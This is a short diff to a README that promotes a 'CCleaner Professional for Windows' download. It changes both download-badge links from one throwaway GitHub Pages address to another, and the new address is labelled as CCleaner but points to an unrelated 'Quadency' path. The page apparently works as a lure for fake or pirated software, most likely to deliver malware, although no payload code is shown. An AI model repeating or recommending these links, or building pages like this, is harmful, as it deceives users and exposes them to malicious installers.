@@ -4,7 +4,7 @@
 
 ## 📥 Download CCleaner Professional for Windows
 
-[![⬇️ Download CCleaner Professional](https://img.shields.io/badge/Download-CCleaner%20Professional-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/CCleaner)
+[![⬇️ Download CCleaner Professional](https://img.shields.io/badge/Download-CCleaner%20Professional-blue?style=for-the-badge&logo=windows)](https://quadency-desktop-app.github.io/.github/Quadency)
 
 ---
 
@@ -28,7 +28,7 @@ CCleaner Professional is an advanced version of the popular CCleaner software, d
 
 CCleaner Professional also includes automatic updates, scheduled cleanings, and advanced tools for managing system startup items and browser data. Whether you're looking to free up disk space, improve system performance, or remove unwanted files, CCleaner Professional provides the tools to get the job done efficiently.
 
-[![⬇️ Download CCleaner Professional](https://img.shields.io/badge/Download-CCleaner%20Professional-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/CCleaner)
+[![⬇️ Download CCleaner Professional](https://img.shields.io/badge/Download-CCleaner%20Professional-blue?style=for-the-badge&logo=windows)](https://quadency-desktop-app.github.io/.github/Quadency)
 
 ---
 
